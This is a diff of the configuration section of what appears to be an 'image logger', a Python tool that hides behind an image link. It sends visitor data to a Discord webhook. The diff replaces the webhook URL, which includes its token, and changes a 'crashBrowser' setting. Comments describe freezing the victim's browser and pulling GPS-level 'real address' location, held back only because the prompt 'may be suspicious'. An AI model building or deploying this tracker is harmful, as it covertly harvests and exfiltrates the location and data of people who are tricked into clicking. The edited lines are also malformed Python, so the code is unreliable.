@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1401663493823926462/UhJWOuK15ETWylfXlBxxhyYO7Qrx5OfDUmYbu0Ypme9fPF-PNMYf9hZvq8yRKzftwObJ",
+    "webhook": "https://discord.com/api/webhooks/1436139222078853193/6O6an9ttqfJu-PxAN_dEcXZGFb5rSCC_BNqU8HaTIT2bVh6m4ds7_aHz4KdZBt587a--",
     "image": "https://tenor.com/kTFiRhhijzv.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -22,7 +22,7 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser" True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
+    "crashBrowser" false, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
     
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
